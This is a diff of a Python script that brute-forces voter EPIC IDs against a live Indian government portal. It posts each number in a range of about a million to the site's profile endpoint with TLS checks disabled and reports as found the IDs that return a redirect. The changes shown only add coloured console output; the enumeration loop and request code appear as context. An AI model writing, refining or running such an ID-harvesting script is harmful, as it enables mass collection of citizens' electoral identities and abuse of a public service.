@@ -5,7 +5,7 @@
 import urllib3
 import requests
 import time
-
+from termcolor import colored
 urllib3.disable_warnings()
 start = time.perf_counter() 
 
@@ -47,11 +47,11 @@ for voter_ID in range(2000000,2999999,1):
     response = requests.post('https://www.nvsp.in/Account/MyProfile',allow_redirects=False, cookies=cookies, headers=headers, data=data, verify=False)
 
     if response.status_code == 302:
-        print(f"Epic-ID FOUND = WRI{voter_ID}")
+        print(f"Epic-ID FOUND = "+colored("WRI"+str(voter_ID),'green'))
     elif response.status_code == 200:
-        print("Not valid ID")
+        print(colored("Not valid ID",'yellow'))
     else:
-        print("session expired")
+        print(colored("Session Expired ",'red')+"(response code = "+colored(str(response.status_code),'yellow')+")")
 
 finish = time.perf_counter()
 
